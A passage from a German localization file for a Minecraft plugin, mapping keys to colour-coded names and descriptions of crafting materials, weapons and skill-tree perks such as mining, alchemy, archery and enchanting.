  ""material-gold-circlet"": ""&fGoldreif"",
  ""material-gold-armring"": ""&aGoldarmreif"",
  ""material-silver-armring"": ""&fSilberarmreif"",
  ""material-attuned-parchment"": ""&dAbgestimmtes Pergament"",
  ""material-melted-wax"": ""&6Geschmolzenes Wachs"",
  ""material-tutor-lotus"": ""&fTutors Lotus"",
  ""material-noxious-spores"": ""&fSchädliche Sporen"",
  ""material-withered-filament"": ""&fWelke Fasern"",
  ""material-steelblossom"": ""&fStahlblume"",
  ""material-shimmerleaf"": ""&fSchimmerblatt"",
  ""material-pollen-stalk"": ""&fPollenkolben"",
  ""material-burnt-bark"": ""&fAusgezehrte Rinde"",
  ""material-goldroot"": ""&fGoldwurzel"",
  ""material-calcified-seed"": ""&fVerhärteter Samen"",
  ""material-knightsreed"": ""&fRittergras"",
  ""material-ambrosial-nectar"": ""&fAmbrosianer Nektar"",
  ""material-bustling-fungus"": ""&fBegeisterter Pilz"",
  ""material-pollen-stalks"": ""&fPollenkolben"",
  ""material-empty-vial"": ""&fLeere Phiole"",
  ""material-vial-poison"": ""&fGiftphiole"",
  ""material-vial-harming"": ""&fSchadensphiole"",
  ""material-vial-holy"": ""&fHeiliqkeitsphiole"",
  ""material-vial-rot"": ""&fVerwesungsphiole"",
  ""material-choral-leather"": ""&fChoral-Leder"",
  ""material-flint-arrow"": ""&fKieselarrow"",
  ""material-wooden-arrow"": ""&fHölzerner Pfeil"",
  ""material-carbon-arrow"": ""&fKohlefaserpfeil"",
  ""material-stone-arrow"": ""&fSteinpfeil"",
  ""material-copper-arrow"": ""&fKupferpfeil"",
  ""material-golden-arrow"": ""&fGoldpfeil"",
  ""material-iron-arrow"": ""&fEisenpfeil"",
  ""material-diamond-arrow"": ""&fDiamantpfeil"",
  ""material-netherite-arrow"": ""&fNethereitepfeil"",
  ""material-explosive-arrow"": ""&6Explosionspfeil"",
  ""material-incendiary-arrow"": ""&eEntzündlicher Pfeil"",
  ""material-ender-arrow"": ""&9Endepfeil"",
  ""material-lightning-arrow"": ""&bGewitterpfeil"",
  ""material-unholy-arrow"": ""&8Unheiliger Pfeil"",
  ""material-wooden-dagger"": ""&fHölzerner Dolch"",
  ""material-stone-dagger"": ""&fSteinDolch"",
  ""material-golden-dagger"": ""&fGoldener Dolch"",
  ""material-iron-dagger"": ""&fEiserner Dolch"",
  ""material-diamond-dagger"": ""&fDiamantdolch"",
  ""material-netherite-dagger"": ""&fNethereitedolch"",
  ""material-wooden-mace"": ""&fHölzerne Streitkeule"",
  ""material-stone-mace"": ""&fSteinStreitkeule"",
  ""material-golden-mace"": ""&fGoldene Streitkeule"",
  ""material-iron-mace"": ""&fEiserne Streitkeule"",
  ""material-diamond-mace"": ""&fDiamantStreitkeule"",
  ""material-netherite-mace"": ""&fNethereitstreitkeule"",
  ""material-wooden-rapier"": ""&fHölzerner Rapier"",
  ""material-stone-rapier"": ""&fSteinrapier"",
  ""material-golden-rapier"": ""&fGoldener Rapier"",
  ""material-iron-rapier"": ""&fEiserner Rapier"",
  ""material-diamond-rapier"": ""&fDiamantrapier"",
  ""material-netherite-rapier"": ""&fNethereiterapier"",
  ""material-wooden-warhammer"": ""&fHölzerner Kriegshammer"",
  ""material-stone-warhammer"": ""&fSteinkriegshammer"",
  ""material-golden-warhammer"": ""&fGoldener Kriegshammer"",
  ""material-iron-warhammer"": ""&fEiserner Kriegshammer"",
  ""material-diamond-warhammer"": ""&fDiamantkriegshammer"",
  ""material-netherite-warhammer"": ""&fNethereitkriegshammer"",
  ""material-wooden-greataxe"": ""&fHölzerne Streitaxt"",
  ""material-stone-greataxe"": ""&fSteinstreitaxt"",
  ""material-golden-greataxe"": ""&fGoldene Streitaxt"",
  ""material-iron-greataxe"": ""&fEiserne Streitaxt"",
  ""material-diamond-greataxe"": ""&fDiamantstreitaxt"",
  ""material-netherite-greataxe"": ""&fNethereitstreitaxt"",
  ""material-wooden-spear"": ""&fHölzerner Speer"",
  ""material-stone-spear"": ""&fSteinspeer"",
  ""material-golden-spear"": ""&fGoldener Speer"",
  ""material-iron-spear"": ""&fEiserner Speer"",
  ""material-diamond-spear"": ""&fDiamantspeer"",
  ""material-netherite-spear"": ""&fNethereitespeer"",
  ""recipe-displayname-salvage"": ""&fVerwerten %item%"",
  ""woodcutting_perk_1_name"": ""&aAnfängerholzfällern"",
  ""woodcutting_perk_1_description"": ""&7Beschleunigt dein Holzfällen um &a10%&7 und du erhältst ein paar Erfahrungskugeln pro Block"",
  ""woodcutting_perk_2_name"": ""&aGoldene Blätter"",
  ""woodcutting_perk_2_description"": ""&7Blätter lassen manchmal &aGoldäpfel&7 fallen und du erhältst etwas mehr Erfahrungskugeln pro Block"",
  ""woodcutting_perk_3_name"": ""&aAbholzung I"",
  ""woodcutting_perk_3_description"": ""&7Schaltet den Baumfäller für kleine Bäume frei"",
  ""woodcutting_perk_4_name"": ""&aGärtner"",
  ""woodcutting_perk_4_description"": ""&7Beschleunigt dein Holzfällen um &a20%&7, du erhältst viel mehr Erfahrungskugeln pro Block und gepflanzte Setzlinge wachsen doppelt so schnell."",
  ""woodcutting_perk_5_name"": ""&aKristallblätter"",
  ""woodcutting_perk_5_description"": ""&7Blätter lassen manchmal &aJuwelienäpfel&7 fallen und Goldäpfel fallen häufiger."",
  ""woodcutting_perk_carpentry_a_name"": ""&aSchreinern"",
  ""woodcutting_perk_carpentry_a_description"": ""&7Erhöht den Ertrag der meisten holzbezogenen Rezepte"",
  ""woodcutting_perk_capitator_a_name"": ""&aAbholzung II"",
  ""woodcutting_perk_capitator_a_description"": ""&7Verstärkt den Baumfäller auf ein Limit von 32 Blöcken und verringert die Abklingzeit auf 7 Sekunden."",
  ""woodcutting_perk_capitator_b_name"": ""&aAbholzung III"",
  ""woodcutting_perk_capitator_b_description"": ""&7Verstärkt den Baumfäller auf ein Limit von 128 Blöcken und verringert die Abklingzeit auf 3 Sekunden."",
  ""woodcutting_perk_combo_name"": ""&aAktiver Lebensstil"",
  ""woodcutting_perk_combo_description"": ""&7Erhöht den Nährwert vieler Nahrungsmittel, reduziert den Hungerverbrauch und erhöht die Gesundheitsregeneration"",
  ""smithing_perk_1_name"": ""&eHandwerker"",
  ""smithing_perk_1_description"": ""&7Erhöht die Qualität deiner &eHolz&7- und &eLeder&7-Gegenstände deutlich."",
  ""smithing_perk_2_name"": ""&eAnfänger-Schmied"",
  ""smithing_perk_2_description"": ""&7Erhöht die Qualität deiner &eStein&7- und &eKettenrüstung&7-Gegenstände deutlich."",
  ""smithing_perk_3_name"": ""&eSchmied"",
  ""smithing_perk_3_description"": ""&7Erhöht die Qualität deiner &eEisen&7- und &eGold&7-Gegenstände deutlich."",
  ""smithing_perk_4_name"": ""&eKristallschmied"",
  ""smithing_perk_4_description"": ""&7Erhöht die Qualität deiner &eDiamant&7-Gegenstände deutlich."",
  ""smithing_perk_5_name"": ""&eHöllenschmiede"",
  ""smithing_perk_5_description"": ""&7Erhöht die Qualität deiner &eNetherit&7-Gegenstände deutlich."",
  ""smithing_perk_6_name"": ""&eDurins Segen"",
  ""smithing_perk_6_description"": ""&7Nachdem du dein Handwerk wirklich gemeistert hast, profitieren alle deine Kreationen von einem &e{smithing_genericcraftingskill_add}&7 Bonus an Qualität"",
  ""smithing_perk_prismarine_name"": ""&9Marine Schmiedekunst"",
  ""smithing_perk_prismarine_description"": ""&7Gewährt dir die Fähigkeit, Dreizacke herzustellen"",
  ""smithing_perk_enderic_name"": ""&dExotische Schmiedekunst"",
  ""smithing_perk_enderic_description"": ""&7Gewährt dir die Fähigkeit, Elytren herzustellen"",
  ""smithing_perk_bows_name"": ""&eErweiterter Bogenbau"",
  ""smithing_perk_bows_description"": ""&7Erhöht die Qualität deiner &eBögen&7 und &eArmbrust&7en deutlich"",
  ""alchemy_perk_1_name"": ""&dStabiler Brand"",
  ""alchemy_perk_1_description"": ""&7Beschleunigt dein Tränkebrauen um &d{alchemy_brewingtimereduction_add}"",
  ""alchemy_perk_2_name"": ""&dKräftige Zutaten"",
  ""alchemy_perk_2_description"": ""&7Gewährt eine &d{alchemy_brewingingredientsavechance_add}&7-Chance, beim Brauen keine Zutaten zu verbrauchen"",
  ""alchemy_perk_a1_name"": ""&dFlüchtige Gifte"",
  ""alchemy_perk_a1_description"": ""&7Verbessert die Qualität deiner Gifte. Deine indirekten Treffer mit Sprühtränken werden stärker"",
  ""alchemy_perk_a2_name"": ""&dChemische Artillerie"",
  ""alchemy_perk_a2_description"": ""&7Verbessert die Qualität deiner Gifte weiter. Verstärkt die Intensität deiner Sprühtränke, die Dauer und Reichweite deiner nachhallenden Tränke sowie die Wurfkraft."",
  ""alchemy_perk_b1_name"": ""&dEffektive Katalysatoren"",
  ""alchemy_perk_b1_description"": ""&7Verbessert die Qualität deiner hilfreichen Tränke. Beschleunigt das Tränkebrauen um &d{alchemy_brewingtimereduction_add}"",
  ""alchemy_perk_b2_name"": ""&dExotische Zutaten"",
  ""alchemy_perk_b2_description"": ""&7Erhöht die Chance, keine Zutaten zu verbrauchen, um &d{alchemy_brewingingredientsavechance_add}&7 und schaltet die &dEile&7- und &dLebensentzug&7-Tränkerezepte frei"",
  ""alchemy_perk_3_name"": ""&dMächtige Mixturen"",
  ""alchemy_perk_3_description"": ""&7Ermöglicht es dir, die Effekte mehrerer Tränke in einem zu vereinen, bis zu &d{alchemy_potioncombiningmaxcombinations_add}&7 Mal, mit etwas Einbuße der Dauer"",
  ""alchemy_perk_4_name"": ""&dPrima Materia"",
  ""alchemy_perk_4_description"": ""&7Verbessert die Qualität aller deiner Tränke deutlich. Schaltet &dTransmutation&7 frei"",
  ""alchemy_perk_combo_name"": ""&dÄtzende Gifta"",
  ""alchemy_perk_combo_description"": ""&7Fügt deiner Waffen-Beschichtungsfähigkeit &d{lightweapons_coatingcharges_add}&7 Ladungen hinzu. Du schaltest Rezepte für ein paar einfache Gifte frei, die ohne Braustand hergestellt werden können"",
  ""mining_perk_1_name"": ""&eMürber Fels"",
  ""mining_perk_1_description"": ""&7Beschleunigt dein Minen um &e{mining_miningspeedbonus_add}&7 und du erhältst ein paar Erfahrungskugeln pro Block"",
  ""mining_perk_2_name"": ""&eAbenteurer"",
  ""mining_perk_2_description"": ""&7Erhöht deine Mineraleausbeute um &e{mining_miningdrops_add}&7 und dein Glück um &e{mining_miningluck_add}&7. Erhöht die Kochgeschwindigkeit um &e{power_cookingspeedbonus_add}"",
  ""mining_perk_a1_name"": ""&eDynamiteur"",
  ""mining_perk_a1_description"": ""&7Erhöht den TNT-Explosionsradius und die Schadensresistenz um &e{mining_tntblastradius_add}&7 und die Sprengstoffausbeute um &e{mining_blastingdrops_add}"",
  ""mining_perk_a2_name"": ""&eErderschütterer"",
  ""mining_perk_a2_description"": ""&eVerdoppelt &7die Auswirkungen des Dynamiteurs und du erhältst dreimal so viel TNT beim Craften."",
  ""mining_perk_a3_name"": ""&eVerzauberte Explosivstoffe"",
  ""mining_perk_a3_description"": ""&7Ermöglicht es dir, zwischen &eSeidiger Berührung &7und &ePlünderung II&7 als Verzauberungen für all dein TNT zu wählen"",
  ""mining_perk_a3silktouch_name"": ""&eVerzauberte Explosivstoffe: Seidiger Griff"",
  ""mining_perk_a3silktouch_description"": ""&7Dein TNT zerbricht Blöcke so, als würde ein Seidiger-Griff-Spitzhacker verwendet"",
  ""mining_perk_a3fortune_name"": ""&eVerzauberte Explosivstoffe: Plünderung"",
  ""mining_perk_a3fortune_description"": ""&7Dein TNT zerbricht Blöcke so, als würde ein Plünderung II-Spitzhacker verwendet"",
  ""mining_perk_b1_name"": ""&eDwergische Veranlagung"",
  ""mining_perk_b1_description"": ""&7Beschleunigt dein Minen um &e{mining_miningspeedbonus_add}&7, erhöht die Erfahrungskugeln pro Block und schaltet die &eBohren&7-Fähigkeit frei"",
  ""mining_perk_b2_name"": ""&eAderförderung"",
  ""mining_perk_b2_description"": ""&7Erhöht deine Mineraleausbeute um &e{mining_miningdrops_add}&7 und dein Glück um &e{mining_miningluck_add}&7. Schaltet &eAderabbau&7 frei und erhöht die Kochgeschwindigkeit um &e{power_cookingspeedbonus_add}"",
  ""mining_perk_3_name"": ""&eErdbruch"",
  ""mining_perk_3_description"": ""&7Erhöht die Bohrgeschwindigkeit nochmal um &e{mining_drillingspeedbonus_add}&7 und &ehalbiert &7deren Abklingzeit. Du erhältst &edoppelt &7so viele Erfahrungskugeln von Blöcken und erhöhst die Kochgeschwindigkeit um &e{power_cookingspeedbonus_add}"",
  ""mining_perk_4_name"": ""&eAspekt von Kali"",
  ""mining_perk_4_description"": ""&7Deine Aderabbau-Fähigkeit kann jetzt Blöcke wie &eAndesiit, Granit, Diorit und andere häufige Nicht-Stein-Blöcke&7 ebenfalls adern-abbauen. Die Ausbeute wird nun auch sofort in dein Inventar übertragen. Erhöht die Kochgeschwindigkeit um &e{power_cookingspeedbonus_add}"",
  ""archery_perk_1_name"": ""&eJäger"",
  ""archery_perk_1_description"": ""&7Verbessert die Genauigkeit leicht und erhöht den Schaden um &e{archery_bowdamagemultiplier_add}"",
  ""archery_perk_2_name"": ""&eReichlicher Jäger"",
  ""archery_perk_2_description"": ""&7Schaltet &eSteinpfeile&7 frei und verringert den Munitionsverbrauch um &e{archery_ammosavechance_add}"",
  ""archery_perk_3_name"": ""&eBogenschütze"",
  ""archery_perk_3_description"": ""&7Schaltet &eKupfer- und Goldpfeile&7 frei, verbessert die Genauigkeit weiter und gewährt &e{archery_bowcritchance_add}&7 Krit-Chance"",
  ""archery_perk_4_name"": ""&eLangstreckenfußtruppe"",
  ""archery_perk_4_description"": ""&7Schaltet &eEisen- und Enderpfeile&7 frei, erhöht den Fernkampfschaden um &e{archery_bowdamagemultiplier_add}&7 und du teilst mehr Schaden aus, je weiter du vom Ziel entfernt bist. Verringert den Munitionsverbrauch um &e{archery_ammosavechance_add}"",
  ""archery_perk_5_name"": ""&eScharfschütze"",
  ""archery_perk_5_description"": ""&7Schaltet &eDiamantpfeile&7 frei, erhöht die kritische Trefferchance um &e{archery_bowcritchance_add}&7 und den kritischen Schaden um &e{archery_critdamage_add}&7. Verbessert die Genauigkeit stark."",
      ""archery_perk_6_name"": ""&eNecrotic-Schüsse"",
      ""archery_perk_6_description"": ""&7Schaltet &eNetheritpfeile und Unheilige Pfeile&7 frei, entfernt die Schadensstrafendigung von Unendlichkeitsbögen und verbessert den Schaden über größere Entfernungen drastisch."",
      ""archery_perk_c1_name"": ""&eGeladen-Schuss I"",
      ""archery_perk_c1_description"": ""&7Schaltet &eGeladen-Schuss&7 frei. Geladene Schüsse profitieren von zusätzlicher Durchdringung, Rückstoß, Geschwindigkeit, Genauigkeit und Schaden."",
      ""archery_perk_c2_name"": ""&eGeladen-Schuss II"",
      ""archery_perk_c2_description"": ""&7Geladene Schüsse erhalten &e{archery_chargedshotcharges_add}&7 und eine verringerte Abklingzeit. Mehr Aufladungen, Durchdringung, Rückstoß und Schaden. Geladene Schüsse ignorieren jetzt auch die Schwerkraft und fliegen immer mit Höchstgeschwindigkeit."",
      ""archery_perk_stealth_name"": ""&eAssassine"",
      ""archery_perk_stealth_description"": ""&7Getroffene Schüsse sind jetzt garantiert kritische Treffer, wenn der Feind sich abwendet und nicht in Kampfbereitschaft ist. Kritische Treffer verursachen &e{archery_critdamage_add}&7 mehr Schaden und verursachen Blutungen."",
      ""digging_perk_1_name"": ""&aGräber"",
      ""digging_perk_1_description"": ""&7Beschleunigt dein Graben um &a{digging_diggingspeedbonus_add}&7 und du erhältst ein paar Erfahrungspunkte pro Block."",
      ""digging_perk_2_name"": ""&aFilterer"",
      ""digging_perk_2_description"": ""&7Du findest nun einfache Ressourcen im Boden und erhältst mehr Erfahrungspunkte pro Block."",
      ""digging_perk_3_name"": ""&aGrundreplikation"",
      ""digging_perk_3_description"": ""&7Du lernst die Zusammensetzung der Erde kennen und kannst sie nun nachbilden (schaltet Rezepte für verschiedene bodenständige Blöcke frei)."",
      ""digging_perk_a1_name"": ""&aArchäologe"",
      ""digging_perk_a1_description"": ""&7Verdächtige Blöcke haben eine &a{digging_archaeologyrepeatchance_add} &7Chance, zurückzukehren."",
      ""digging_perk_a2_name"": ""&aAntike"",
      ""digging_perk_a2_description"": ""&7Verdächtige Blöcke haben eine zusätzliche &a{digging_archaeologyrepeatchance_add} &7Chance, zurückzukehren, und du hast eine kleine Chance (die in der Nähe von Strukturen zunimmt), verdächtigen Sand oder Kies beim Graben zu finden."",
      ""digging_perk_b1_name"": ""&aGräber"",
      ""digging_perk_b1_description"": ""&7Beschleunigt dein Graben um weitere &a{digging_diggingspeedbonus_add}."",
      ""digging_perk_b2_name"": ""&aUmgraben"",
      ""digging_perk_b2_description"": ""&7Du findest nun wertvolle Ressourcen im Boden."",
      ""digging_perk_4_name"": ""&aVersteckter Schatz"",
      ""digging_perk_4_description"": ""&7Du wirst gelegentlich Schätze beim Graben finden."",
      ""digging_perk_combo_name"": ""&aFlexibler Baumeister"",
      ""digging_perk_combo_description"": ""&7Schaltet mehrere Interaktionen frei, die es dir ermöglichen, deine Bauten detaillierter zu gestalten. (Beispiele: Moos auf Cobblestone anbringen, Risse in Ziegelsteine einbringen)"",
      ""enchanting_perk_1_name"": ""&bRunischer Fokus"",
      ""enchanting_perk_1_description"": ""&7Erhöht die Verzauberungsfertigkeit um &b{enchanting_enchantingskill_add}"",
      ""enchanting_perk_a1_name"": ""&bStabile Verbindung"",
      ""enchanting_perk_a1_description"": ""&7Verringert den Erfahrungspunktverzehr um &b{enchanting_essencerefundfraction_add}&7 und den Lapislazuli-Verbrauch um &b{enchanting_lapissavechance_add}"",
      ""enchanting_perk_a2_name"": ""&bReine Verbindung"",
      ""enchanting_perk_a2_description"": ""&7Erhöht die Verzauberungsfertigkeit um &b{enchanting_enchantingskill_add}&7, verringert den Erfahrungspunktverzehr um &b{enchanting_essencerefundfraction_add}&7 und den Lapislazuli-Verbrauch um &b{enchanting_lapissavechance_add}"",
      ""enchanting_perk_b1_name"": ""&bMentaler Fokus"",
      ""enchanting_perk_b1_description"": ""&7Du erhältst &b{enchanting_essencemultiplier_add} &7mehr Erfahrungspunkte aus allem und lernst alle Fertigkeiten &b{power_allskillexpmultiplier_add} &7schneller"",
      ""enchanting_perk_b2_name"": ""&bHexklinge"",
      ""enchanting_perk_b2_description"": ""&7Schaltet &bHexklinge&7 frei. Du erhältst &b{enchanting_essencemultiplier_add} &7mehr Erfahrungspunkte aus allem und lernst alle Fertigkeiten &b{power_allskillexpmultiplier_add} &7schneller"",
      ""enchanting_perk_radiant_name"": ""&bHexklinge: &e&lHeilig"",
      ""enchanting_perk_radiant_description"": ""&7Hexklinge verursacht &e&lHeiligen &7Schaden, der besonders effektiv gegen Untote und Nether-Kreaturen ist, aber alles andere immun ist. Du kannst den Hexklinge-Schadenstyp jederzeit wechseln."",
      ""enchanting_perk_necrotic_name"": ""&bHexklinge: &8&lUnheilig"",
      ""enchanting_perk_necrotic_description"": ""&7Hexklinge verursacht &8&lUnheiligen &7Schaden, der gegen Untote nutzlos, aber gegen alles andere effektiv ist. Du kannst den Hexklinge-Schadenstyp jederzeit wechseln."",
      ""enchanting_perk_2_name"": ""&bArkane Standfestigkeit"",
      ""enchanting_perk_2_description"": ""&7Erhöht die Verzauberungsfertigkeit um &b{enchanting_enchantingskill_add}&7 und verringert den Erfahrungspunktverzehr um &b{enchanting_essencerefundfraction_add}&7. Du kannst zwischen Schadens- oder Schutzenzaubereinen wählen, um diese um &b+1&7 Stufe zu verstärken"",
      ""enchanting_perk_sharpnesses_name"": ""&bArkane Standfestigkeit: Schaden"",
      ""enchanting_perk_sharpnesses_description"": ""&7Alle neuen &bSchärfe&7-, &bSchmettern&7-, &bDurchbohren&7-, &bKraft&7- und &bVernichter der Gliederfüßer&7-Verzauberungen sind dauerhaft um 1 Stufe erhöht. Du kannst nur einmal wählen"",
      ""enchanting_perk_protections_name"": ""&bArkane Standfestigkeit: Schutz"",
      ""enchanting_perk_protections_description"": ""&7Alle neuen &bExplosions&7-, &bProjektil&7-, &bFeuer&7- und regulären &bSchutz&7- sowie &bFederfall&7-Verzauberungen sind dauerhaft um 1 Stufe erhöht. Du kannst nur einmal wählen"",
      ""enchanting_perk_3_name"": ""&bErzmagier"",
      ""enchanting_perk_3_description"": ""&7Erhöht die Verzauberungsfertigkeit um &b{enchanting_enchantingskill_add}&7. Du kannst zwischen Plünderung oder Unzerbrechlichkeit wählen, um diese um &b+2&7 Stufen zu verstärken, oder Glück um +1 Stufe"",
      ""enchanting_perk_fortune_name"": ""&bErzmagier: Glück"",
      ""enchanting_perk_fortune_description"": ""&7Alle neuen &bGlück&7-Verzauberungen sind dauerhaft um &b1&7 Stufe erhöht. Du kannst nur einmal wählen"",
      ""enchanting_perk_looting_name"": ""&bErzmagier: Plünderung"",
      ""enchanting_perk_looting_description"": ""&7Alle neuen &bPlünderung&7-Verzauberungen sind dauerhaft um &b&l2&7 Stufen erhöht. Du kannst nur einmal wählen"",
      ""enchanting_perk_unbreaking_name"": ""&bErzmagier: Unzerbrechlichkeit"",
      ""enchanting_perk_unbreaking_description"": ""&7Alle neuen &bUnzerbrechlichkeit&7-Verzauberungen sind dauerhaft um &b&l2&7 Stufen erhöht. Du kannst nur einmal wählen"",
      ""enchanting_perk_4_name"": ""&bGöttlicher Nexus"",
      ""enchanting_perk_4_description"": ""&7Erhöht die Verzauberungsfertigkeit um &b{enchanting_enchantingskill_add}&7. Du kannst zwischen allen offensiven, defensiven oder nützlichen Verzauberungen wählen, um diese um &b+1&7 Stufe zu verstärken"",
      ""enchanting_perk_offensive_name"": ""&bGöttlicher Nexus: Beschwörung"",
      ""enchanting_perk_offensive_description"": ""&7Alle neuen &boffentiven&7 Verzauberungen sind dauerhaft um &b1&7 Stufen erhöht. Du kannst nur einmal wählen"",
      ""enchanting_perk_defensive_name"": ""&bGöttlicher Nexus: Bannzauber"",
      ""enchanting_perk_defensive_description"": ""&7Alle neuen &bverteidigenden&7 Verzauberungen sind dauerhaft um &b1&7 Stufen erhöht. Du kannst nur einmal wählen"",
      ""enchanting_perk_utility_name"": ""&bGöttlicher Nexus: Wahrsagerei"",
      ""enchanting_perk_utility_description"": ""&7Alle neuen &bnützlichen&7 Verzauberungen sind dauerhaft um &b1&7 Stufen erhöht. Du kannst nur einmal wählen"",
      ""enchanting_perk_combo_name"": ""&bHabichtglück"",
      ""enchanting_perk_combo_description"": ""&7Erhöht das Glück um &b{power_luckbonus_add}"",
      ""lightweapons_perk_1_name"": ""&eSöldner"",
      ""lightweapons_perk_1_description"": ""&7Erhöht den Schaden um &e{lightweapons_damagemultiplier_add}&7. "",
      ""lightweapons_perk_2_name"": ""&eKnappe"",
      ""lightweapons_perk_2_description"": ""&7Erhöht die Angriffsgeschwindigkeit um &e{lightweapons_attackspeedmultiplier_add}&7 und gewährt &e{lightweapons_critchance_add} &7kritische Trefferchance. "",
      ""lightweapons_perk_3_name"": ""&eRitter"",
      ""lightweapons_perk_3_description"": ""&7Schaltet &eParieren&7 frei. Erhöht den Schaden um &e{lightweapons_damagemultiplier_add}"",
      ""lightweapons_perk_4_name"": ""&ePaladin"",
      ""lightweapons_perk_4_description"": ""&7Erhöht die Angriffsgeschwindigkeit um &e{lightweapons_attackspeedmultiplier_add}&7 und Feinde sind &e{lightweapons_immunityreductionfraction_add} &7weniger immun"",
      ""lightweapons_perk_5_name"": ""&eTempler"",
      ""lightweapons_perk_5_description"": ""&7Erhöht den Schaden um &e{lightweapons_damagemultiplier_add}&7, &eParieren &7wird viel einfacher und stärker, und Feinde sind &e{lightweapons_immunityreductionfraction_add} &7weniger immun. "",
      ""lightweapons_perk_6_name"": ""&eFeldherr"",
      ""lightweapons_perk_6_description"": ""&7Erhöht die kritische Trefferchance um &e{lightweapons_critchance_add}&7 und kritische Treffer verursachen &e{lightweapons_critdamage_add} &7mehr Schaden. Kritische Treffer verursachen jetzt &eBlutwunden&7, und Blutwunden verursachen &e{lightweapons_bleeddamage_add} &7mehr Schaden"",
      ""lightweapons_perk_a1_name"": ""&eWaffenbeschichtung"",
      ""lightweapons_perk_a1_description"": ""&7Schaltet &eWaffenbeschichtung&7 frei, mit der du Tränkeeffekte auf deine Waffen auftragen kannst. Die aufgetragenen Tränkeeffekte sind in Stärke und Dauer reduziert und halten für &e{lightweapons_coatingcharges_add} &7Treffer"",
      ""lightweapons_perk_a2_name"": ""&eBiowaffe"",
      ""lightweapons_perk_a2_description"": ""&eWaffenbeschichtung &7wird noch stärker, hält länger, wendet einen größeren Effekt an und bleibt für &e{lightweapons_coatingcharges_add} &7weitere Treffer auf deinen Waffen"",
      ""lightweapons_perk_combo_name"": ""&eTitan"",
      ""lightweapons_perk_combo_description"": ""&7Erhalte &e{lightweapons_penetrationflat_add} &7Rüstungsdurchdringung, &e{lightweapons_knockbackmultiplier_add} &7mehr Rückstoß und &e{lightweapons_attackreachbonus_add} &7größere Reichweite"",
      ""heavyweapons_perk_1_name"": ""&cWild"",
      ""heavyweapons_perk_1_description"": ""&7Erhöht den Schaden um &c{heavyweapons_damagemultiplier_add}&7. "",
      ""heavyweapons_perk_2_name"": ""&cBrutalos"",
      ""heavyweapons_perk_2_description"": ""&7Erhöht den Schaden von Kraftangriffen um &c{heavyweapons_powerattackdamagemultiplier_add}&7 und gewährt &c{heavyweapons_critchance_add} &7kritische Trefferchance. "",
      ""heavyweapons_perk_3_name"": ""&cBarbar"",
      ""heavyweapons_perk_3_description"": ""&7Kraftangriffe verursachen nun &c{heavyweapons_powerattackfraction_add} &7Splash-Schaden in einem &c{heavyweapons_powerattackradius_add}&7 Block großen Radius. Erhöht den Schaden um &c{heavyweapons_damagemultiplier_add}"",
      ""heavyweapons_perk_4_name"": ""&cWikinger"",
      ""heavyweapons_perk_4_description"": ""&7Erhöht den Schaden von Kraftangriffen um &c{heavyweapons_powerattackdamagemultiplier_add}&7 und du erhältst &c{heavyweapons_penetrationflat_add} &7Rüstungsdurchdringung"",
      ""heavyweapons_perk_5_name"": ""&cBerserker"",
      ""heavyweapons_perk_5_description"": ""&7Erhöht den Schaden um &c{heavyweapons_damagemultiplier_add}&7, Kraftangriffe verursachen viel größeren Splash-Schaden in einem größeren Radius und du erhältst &c{heavyweapons_penetrationflat_add}&7 zusätzliche Rüstungsdurchdringung. "",
      ""heavyweapons_perk_6_name"": ""&cTodeskünder"",
      ""heavyweapons_perk_6_description"": ""&7Erhöht die kritische Trefferchance um &c{heavyweapons_critchance_add}&7 und kritische Treffer verursachen &c{heavyweapons_critdamage_add} &7mehr Schaden. Kritische Treffer verursachen jetzt &cBlutwunden&7 und Blutwunden verursachen &c{heavyweapons_bleeddamage_add} &7mehr Schaden"",
      ""heavyweapons_perk_a1_name"": ""&cWaffenbeschichtung"",
      ""heavyweapons_perk_a1_description"": ""&7Schaltet &cWaffenbeschichtung&7 frei, mit der du Tränkeeffekte auf deine Waffen auftragen kannst. Die aufgetragenen Tränkeeffekte sind in Stärke und Dauer reduziert und halten für &c{heavyweapons_coatingcharges_add} &7Treffer"",
      ""heavyweapons_perk_a2_name"": ""&cToxischer Stahl"",
      ""heavyweapons_perk_a2_description"": ""&cWaffenbeschichtung &7wird noch stärker, hält länger, wendet einen größeren Effekt an und bleibt für &c{heavyweapons_coatingcharges_add} &7weitere Treffer auf deinen Waffen"",
      ""heavyweapons_perk_combo_name"": ""&cZerschmetternde Schläge"",
      ""heavyweapons_perk_combo_description"": ""&7Erhalte &c{heavyweapons_penetrationfraction_add} &7Rüstungsdurchdringung, &c{heavyweapons_stunchance_add} &7Betäubungschance und du verursachst &c{heavyweapons_damagetolightarmormultiplier_add} &7mehr Schaden für jedes Leichtpanzer-Teil, das der Feind trägt"",
      ""heavyarmor_perk_1_name"": ""&cGestärkte Passform"",
      ""heavyarmor_perk_1_description"": ""&7Schwere Rüstung wird &c{heavyarmor_heavyarmormultiplier_add} &7schützender"",
      ""heavyarmor_perk_1a_name"": ""&cSkippe nie den Leg Day"",
      ""heavyarmor_perk_1a_description"": ""&7Schwere Rüstung verlangsamt dich weniger"",
      ""heavyarmor_perk_2a_name"": ""&cInnovative Infanterie"",
      ""heavyarmor_perk_2a_description"": ""&7Du musst nur 3 Teile schwerer Rüstung tragen, um von den Bonus-Effekten der schweren Rüstung zu profitieren. Schwere Rüstung verlangsamt dich halb so sehr"",
      ""heavyarmor_perk_1b_name"": ""&cLebensstahl"",
      ""heavyarmor_perk_1b_description"": ""&7Wenn du einen kompletten Satz schwerer Rüstung trägst, erhältst du &c{heavyarmor_sethealingbonus_add} &7zusätzliche Heilung. Schwere Rüstung wird &c{heavyarmor_heavyarmormultiplier_add} &7schützender"",
      ""heavyarmor_perk_2b_name"": ""&cDornenpanzer"",
      ""heavyarmor_perk_2b_description"": ""&7Wenn du einen kompletten Satz schwerer Rüstung trägst, hast du eine &c{heavyarmor_setreflectchance_add} &7Chance, &c{heavyarmor_setreflectfraction_add} &7des Schadens an den Angreifer zurückzureflektieren. Schwere Rüstung wird &c{heavyarmor_heavyarmormultiplier_add} &7schützender"",
      ""heavyarmor_perk_2_name"": ""&cJuggernaut"",
      ""heavyarmor_perk_2_description"": ""&7Wenn du einen kompletten Satz schwerer Rüstung trägst, erhältst du &c{heavyarmor_setknockbackresistance_add} &7Rückstoßresistenz sowie Immunität gegen &cSchwäche&7, &cLangsamkeit&7 und &cLevitation"",
      ""heavyarmor_perk_1c_name"": ""&cZorn"",
      ""heavyarmor_perk_1c_description"": ""&7Schaltet &cZorn&7 frei. Wenn du niedrige Gesundheit erreichst, erhältst du kurzzeitig verschiedene mächtige Buffs, um länger im Kampf bleiben zu können"",
      ""heavyarmor_perk_2c_name"": ""&cWut"",
